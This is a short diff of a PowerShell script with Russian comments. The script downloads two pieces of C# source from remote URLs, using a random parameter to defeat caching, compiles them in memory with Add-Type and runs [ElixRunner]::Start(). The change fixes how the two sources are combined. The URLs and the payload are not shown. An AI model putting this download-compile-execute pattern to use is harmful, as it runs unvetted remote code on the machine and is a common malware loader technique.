@@ -8,18 +8,16 @@ $uri2 = [System.Uri]($u2_raw.Trim() + "?v=" + (Get-Random))
 
 $web = New-Object System.Net.WebClient
 try {
-
     $c1 = $web.DownloadString($uri1)
     $c2 = $web.DownloadString($uri2)
 
     if ($c1 -and $c2) {
-
-        Add-Type -TypeDefinition ($c1 + "[System.Environment]::NewLine" + $c2)
-        
+        # Передаем обе переменные как массив через запятую.
+        # PowerShell сам корректно обработает их при компиляции.
+        Add-Type -TypeDefinition $c1, $c2
 
         [ElixRunner]::Start()
     }
 } catch {
-
     Write-Error "Ошибка инициализации: $($_.Exception.Message)"
 }
